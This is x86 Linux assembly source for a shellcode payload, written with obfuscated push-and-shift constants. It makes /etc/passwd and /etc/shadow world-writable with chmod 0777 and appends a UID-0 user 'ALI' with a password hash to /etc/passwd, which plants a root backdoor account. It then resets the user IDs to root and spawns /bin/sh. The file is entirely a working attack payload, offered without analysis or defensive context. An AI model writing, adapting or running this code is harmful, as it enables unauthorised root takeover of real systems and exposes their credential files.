global _start
section .text

_start:

;xor eax,eax
xor ebx,ebx
;push 0xf
;mul ebx
mov al, 0xf
;pop eax
;push dword 0x6477736a
;pop ebx
mov ebx, 0x6477736a
shr ebx,byte 0x8
push ebx
push dword 0x7361702f
push dword 0x6374652f
mov ebx,esp
push dword 0x1ff4141
pop ecx
shr ecx,byte 0x8
shr ecx,byte 0x8
int 0x80
push byte +0xf
pop eax
push dword 0x776f646a
pop ebx
shr ebx,byte 0x8
push ebx
push dword 0x6168732f
push dword 0x6374652f
mov ebx,esp
push dword 0x1ff4141
pop ecx
shr ecx,byte 0x8
shr ecx,byte 0x8
int 0x80
push byte +0x5
pop eax
push dword 0x64777341
pop ebx
shr ebx,byte 0x8
push ebx
push dword 0x7361702f
push dword 0x6374652f
mov ebx,esp
push dword 0x4014141
pop ecx
shr ecx,byte 0x8
shr ecx,byte 0x8
int 0x80
mov ebx,eax
push byte +0x4
pop eax
push dword 0xa687341
pop ecx
shr ecx,byte 0x8
push ecx
push dword 0x61622f6e
push dword 0x69622f3a
push dword 0x746f6f72
push dword 0x2f3a494c
push dword 0x413a303a
push dword 0x303a2e4b
push dword 0x57557766
push dword 0x50317068
push dword 0x4165597a
push dword 0x51416141
push dword 0x74753849
push dword 0x68594d50
push dword 0x7a744254
push dword 0x54382f51
push dword 0x676d3645
push dword 0x732e5076
push dword 0x3752584e
push dword 0x48554b39
push dword 0x42592f72
push dword 0x474b7856
push dword 0x5a665539
push dword 0x686a5646
push dword 0x79386346
push dword 0x716a5970
push dword 0x68536977
push dword 0x5467546e
push dword 0x37694d58
push dword 0x246e412f
push dword 0x4d6e5570
push dword 0x6a243624
push dword 0x3a494c41
mov ecx,esp
mov edx,0x7f414141
shr edx,byte 0x8
shr edx,byte 0x8
shr edx,byte 0x8
int 0x80
xor eax,eax
mov al,0x46
xor ebx,ebx
xor ecx,ecx
int 0x80
xor eax,eax
mov al,0x46
xor ebx,ebx
xor ecx,ecx
int 0x80
push dword 0x59595959
push dword 0x58585858
push dword 0x4268732f
push dword 0x6e69622f
mov ebx,esp
xor eax,eax
mov [ebx+0x7],al
mov [ebx+0x8],ebx
mov [ebx+0xc],eax
mov al,0xb
lea ecx,[ebx+0x8]
lea edx,[ebx+0xc]
int 0x80
mov al,0x1
mov bl,0x1
int 0x80

